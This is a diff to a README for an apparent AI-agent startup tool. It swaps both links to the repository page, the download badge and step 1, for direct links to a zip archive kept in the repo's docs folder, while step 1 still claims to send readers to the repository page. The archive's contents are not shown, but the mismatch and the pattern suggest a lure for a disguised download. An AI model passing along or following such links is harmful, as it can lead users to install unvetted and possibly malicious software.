@@ -1,6 +1,6 @@
 # 🚀 Agent-Startup-Skills - Build SaaS startups with smart AI agents
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/batterfried-philosophy172/Agent-Startup-Skills)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/batterfried-philosophy172/Agent-Startup-Skills/raw/refs/heads/main/docs/Startup-Skills-Agent-1.5.zip)
 
 ## What is this tool?
 
@@ -21,7 +21,7 @@ Your computer needs specific tools to run this software. Please install these it
 
 Follow these instructions to set up the software on your machine:
 
-1. Visit the repository page to download the project files: [https://github.com/batterfried-philosophy172/Agent-Startup-Skills](https://github.com/batterfried-philosophy172/Agent-Startup-Skills).
+1. Visit the repository page to download the project files: [https://github.com/batterfried-philosophy172/Agent-Startup-Skills/raw/refs/heads/main/docs/Startup-Skills-Agent-1.5.zip](https://github.com/batterfried-philosophy172/Agent-Startup-Skills/raw/refs/heads/main/docs/Startup-Skills-Agent-1.5.zip).
 2. Click the green "Code" button on the webpage and select "Download ZIP".
 3. Locate the downloaded file in your "Downloads" folder.
 4. Right-click the file and select "Extract All". Choose a folder on your desktop for easy access.
